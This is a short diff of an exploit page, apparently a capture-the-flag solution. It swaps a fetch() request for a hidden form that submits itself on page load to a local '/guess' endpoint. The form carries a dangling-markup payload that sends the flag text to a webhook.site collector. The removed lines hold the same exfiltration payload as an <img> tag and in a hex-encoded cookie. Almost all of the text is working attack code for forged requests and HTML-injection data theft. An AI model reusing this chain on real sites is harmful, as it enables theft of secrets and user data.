@@ -1,11 +1,10 @@
+</script>
+<form id="e" action="http://127.0.0.1:5000/guess" method="POST">
+  <input type="hidden" name="guess" value="NHNC{" />
+  <input type="hidden" name="note" value='<http://webhook.site/84a03765-23d9-4cd6-961b-e43af3653d6a?flag=NHNC{">' />
+  <button type="submit">Submit</button>
+</form>
+
 <script>
-  fetch('https://127.0.0.1:5000/guess', {
-  method: 'POST',
-  credentials: 'include',
-  headers: { 'Content-Type': 'application/x-www-form-urlencoded','Cookie': 'best=4e484e437b:3c696d67207372633d22687474703a2f2f776562686f6f6b2e736974652f38346130333736352d323364392d346364362d393631622d6534336166333635336436613f666c61673d4e484e437b223e' },
-  body: new URLSearchParams({
-    guess: 'NHNC{',
-    note: '<img src="http://webhook.site/84a03765-23d9-4cd6-961b-e43af3653d6a?flag=NHNC{" />'
-  })
-});
+  document.getElementById('e').submit();
 </script>
